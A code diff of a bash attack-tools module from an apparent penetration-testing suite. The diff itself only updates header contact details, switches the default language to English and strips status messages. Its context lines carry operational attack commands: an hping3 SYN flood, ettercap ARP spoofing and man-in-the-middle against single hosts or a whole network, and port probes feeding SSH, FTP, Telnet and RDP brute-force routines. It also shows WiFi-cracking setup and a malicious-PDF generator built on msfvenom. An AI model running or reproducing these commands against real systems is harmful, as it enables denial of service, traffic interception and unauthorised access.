@@ -3,8 +3,11 @@
 # Brabus Recon Suite (BRS) - Attack Tools Module
 # Network penetration testing and attack simulation tools
 # Company: EasyProTech LLC (www.easypro.tech)
+# Repository: https://github.com/EPTLLC/brs
+# Contact: mail.easypro.tech@gmail.com
+# Telegram: https://t.me/easyprotechaifactory
 # Author: brabus
-# Version: 1.0
+# Version: 2.0
 
 # ⚠️ CRITICAL LEGAL WARNING ⚠️
 # UNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN CRIMINAL PROSECUTION
@@ -79,7 +82,7 @@ LANGUAGE_CONFIG="$CONFIG_DIR/language.conf"
 if [ -f "$LANGUAGE_CONFIG" ]; then
     source "$LANGUAGE_CONFIG"
 else
-    CURRENT_LANGUAGE="ru"
+    CURRENT_LANGUAGE="en"
 fi
 
 # Load language file
@@ -204,10 +207,8 @@ ssh_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_ssh_attack_${TARGET//\//_}.txt"
     
-    echo -e "${BLUE}🔑 $ATTACK_SSH_BRUTE $TARGET...${NC}"
     
     # Check SSH port availability
-    echo -e "${CYAN}$CONNECTIVITY_CHECKING SSH...${NC}"
     if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/22" 2>/dev/null; then
         echo -e "${RED}$CONNECTIVITY_SSH_FAILED${NC}"
         echo -e "${YELLOW}$CONNECTIVITY_REASONS${NC}"
@@ -288,10 +289,8 @@ ftp_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_ftp_attack_${TARGET//\//_}.txt"
     
-    echo -e "${BLUE}📁 $ATTACK_FTP_BRUTE $TARGET...${NC}"
     
     # Check FTP port availability
-    echo -e "${CYAN}$CONNECTIVITY_CHECKING FTP...${NC}"
     if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/21" 2>/dev/null; then
         echo -e "${RED}$CONNECTIVITY_FTP_FAILED${NC}"
         echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:21${NC}"
@@ -330,10 +329,8 @@ http_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_http_attack.txt"
     
-    echo -e "${BLUE}🌐 $ATTACK_HTTP_BRUTE $URL...${NC}"
     
     # Check HTTP port availability
-    echo -e "${CYAN}$CONNECTIVITY_CHECKING HTTP...${NC}"
     # Extract host from URL
     HTTP_HOST=$(echo "$URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's|:.*$||')
     HTTP_PORT=$(echo "$URL" | grep -o ':[0-9]*' | tr -d ':')
@@ -370,10 +367,8 @@ telnet_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_telnet_attack_${TARGET//\//_}.txt"
     
-    echo -e "${BLUE}📺 $ATTACK_TELNET_BRUTE $TARGET...${NC}"
     
     # Check Telnet port availability
-    echo -e "${CYAN}$CONNECTIVITY_CHECKING Telnet...${NC}"
     if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/23" 2>/dev/null; then
         echo -e "${RED}$CONNECTIVITY_TELNET_FAILED${NC}"
         echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:23${NC}"
@@ -405,10 +400,8 @@ rdp_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_rdp_attack_${TARGET//\//_}.txt"
     
-    echo -e "${BLUE}🖥️ $ATTACK_RDP_BRUTE $TARGET...${NC}"
     
     # Check RDP port availability
-    echo -e "${CYAN}$CONNECTIVITY_CHECKING RDP...${NC}"
     if ! timeout 3 bash -c "cat < /dev/null > /dev/tcp/$TARGET/3389" 2>/dev/null; then
         echo -e "${RED}$CONNECTIVITY_RDP_FAILED${NC}"
         echo -e "${YELLOW}$CONNECTIVITY_CHECK_AVAILABILITY $TARGET:3389${NC}"
@@ -453,13 +446,11 @@ dos_attack() {
     read DURATION
     DURATION=${DURATION:-30}
     
-    echo -e "${BLUE}$ATTACK_DOS_STARTING $TARGET:$PORT ($DURATION sec)...${NC}"
     
     # Use hping3 if available, otherwise install it
     if command -v hping3 &> /dev/null; then
         timeout "$DURATION" hping3 -S -p "$PORT" --flood "$TARGET"
     else
-        echo "Installing hping3..."
         sudo apt install -y hping3
         timeout "$DURATION" hping3 -S -p "$PORT" --flood "$TARGET"
     fi
@@ -471,7 +462,6 @@ arp_spoof() {
     echo -e "${BLUE}🕸️ $ATTACK_ARP_SPOOF${NC}"
     
     if ! command -v ettercap &> /dev/null; then
-        echo "Installing ettercap..."
         sudo apt install -y ettercap-text-only
     fi
     
@@ -482,7 +472,6 @@ arp_spoof() {
     echo -n "$ATTACK_INTERFACE_PROMPT "
     read INTERFACE
     
-    echo -e "${BLUE}$ATTACK_ARP_STARTING $GATEWAY to $TARGET_IP...${NC}"
     echo -e "${YELLOW}$ATTACK_PRESS_CTRL_C${NC}"
     
     sudo ettercap -T -i "$INTERFACE" -M arp:remote /"$GATEWAY"/ /"$TARGET_IP"/
@@ -492,7 +481,6 @@ mitm_attack() {
     echo -e "${BLUE}🕵️ $ATTACK_MITM${NC}"
     
     if ! command -v ettercap &> /dev/null; then
-        echo "Installing ettercap..."
         sudo apt install -y ettercap-text-only
     fi
     
@@ -512,7 +500,6 @@ mitm_attack() {
             sudo ettercap -T -i "$INTERFACE" -P list
             ;;
         2)
-            echo -e "${BLUE}🌐 MITM attack on entire network...${NC}"
             sudo ettercap -T -i "$INTERFACE" -M arp:remote //
             ;;
         3)
@@ -520,7 +507,6 @@ mitm_attack() {
             read TARGET1
             echo -n "Target IP 2: "
             read TARGET2
-            echo -e "${BLUE}🎯 MITM between $TARGET1 and $TARGET2...${NC}"
             sudo ettercap -T -i "$INTERFACE" -M arp:remote /"$TARGET1"/ /"$TARGET2"/
             ;;
     esac
@@ -538,7 +524,6 @@ directory_bruteforce() {
     TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
     OUTPUT_FILE="$RESULTS_DIR/${TIMESTAMP}_dirbuster.txt"
     
-    echo -e "${BLUE}📂 Directory search on $BASE_URL...${NC}"
     
     # Create basic directory list
     cat > /tmp/dirs.txt << EOL
@@ -594,7 +579,6 @@ wifi_attack() {
     echo -e "${BLUE}📡 WiFi attacks${NC}"
     
     if ! command -v aircrack-ng &> /dev/null; then
-        echo "Installing aircrack-ng suite..."
         sudo apt install -y aircrack-ng
     fi
     
@@ -643,7 +627,6 @@ create_malicious_pdf() {
     echo -e "${BLUE}📄 Generate malicious PDF${NC}"
     
     if ! command -v msfvenom &> /dev/null; then
-        echo "Metasploit not installed. Using alternative method..."
         return 1
     fi
     
